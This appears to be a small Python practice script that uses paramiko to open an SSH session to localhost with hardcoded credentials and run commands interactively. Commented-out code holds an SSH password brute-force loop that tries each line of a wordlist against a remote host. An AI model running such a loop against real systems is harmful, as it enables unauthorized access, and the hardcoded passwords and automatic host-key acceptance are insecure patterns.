import paramiko

# ssh= paramiko.SSHClient()
# ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
# ssh.connect('1.1.1.1', port=22, username='test', password='test1')


# with open('passwords.txt', 'r') as file:
#         for passcode in file:
#             try:
#                 ssh.connect('1.1.1.1', port=22, username='test', password= passcode[:-1])
#             except:
#                 pass



# with open('passwords.txt', 'r') as file:
#         for password in file:
#             if password[:-1] == 'mkaek':
#                 print('True')
#                 break
#             print(password[:-1])
        

# def ssh_connect(ip, user, password, command):
#     client = paramiko.SSHClient()
#     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#     client.connect(ip, username= user, password= password)
#     session = client.get_transport().open_session()
#     if session.active:
#         session.exec_command(command)
#         print(session.recv(1024))
#     return 
# ssh_connect('127.0.0.1', 'test', 'test123', 'id')



hostname = '127.0.0.1'
port = 22
user = 'phil'
passwd = 'pythoncode'

try:
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(hostname, port= port, username= user, password= passwd)

    while True:
        try:
            cmd = input("$> ")
            if cmd == "exit": break 
            stdin, stdout, stderr = client.exec_command(cmd)
            print(stdout.read().decode())


        except KeyboardInterrupt:
            break
    client.close()


except Exception as err:
    print(str(err))